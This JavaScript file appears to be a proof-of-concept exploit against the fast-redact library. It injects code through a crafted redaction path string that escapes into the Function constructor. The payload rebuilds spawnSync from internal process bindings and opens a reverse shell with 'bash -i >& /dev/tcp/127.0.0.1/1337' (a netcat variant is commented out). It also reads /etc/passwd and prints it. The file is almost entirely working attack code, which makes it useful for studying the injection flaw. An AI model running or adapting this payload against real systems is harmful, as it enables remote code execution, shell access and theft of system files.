const fastRedact = require('./index.js')
const fauxRequest = {
  headers: {
    host: 'http://example.com',
    cookie: `oh oh we don't want this exposed in logs in etc.`,
    referer: `if we're cool maybe we'll even redact this`
  }
}
const redact = fastRedact({
  paths: ['headers.cookie', `a\n&& (function(){
    this && typeof this.constructor === 'function' && this.constructor.constructor(\`
//      // Source: https://github.com/nodejs/node/blob/master/lib/child_process.js
//      // Defines spawn_sync and normalizeSpawnArguments (without error handling). These are internal variables.
//      spawn_sync = process.binding('spawn_sync'); normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(' ');typeof a.shell==='string'?c=a.shell:c='/bin/sh',b=['-c',g];}typeof a.argv0==='string'?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+'='+d[f]);return{file:c,args:b,options:a,envPairs:e};}
//      // Defines spawnSync, the function that will do the actual spawning
//      spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!=='buffer')for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + 'spawnSync '+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;}
//      // with netcat
//      // spawnSync('/bin/nc', ['-e', '/bin/bash', 'localhost', '1337'])
//      // without netcat
//      spawnSync('/bin/bash', ['-c', 'bash -i >& /dev/tcp/127.0.0.1/1337 0>&1'])
const buffer = Buffer.allocUnsafe(8192)
process.binding('fs').read(process.binding('fs').open('/etc/passwd', 0, 0600), buffer, 0, 4096)
console.log(buffer.toString())
    \`)()
    }())`]
})

console.log(redact(fauxRequest))
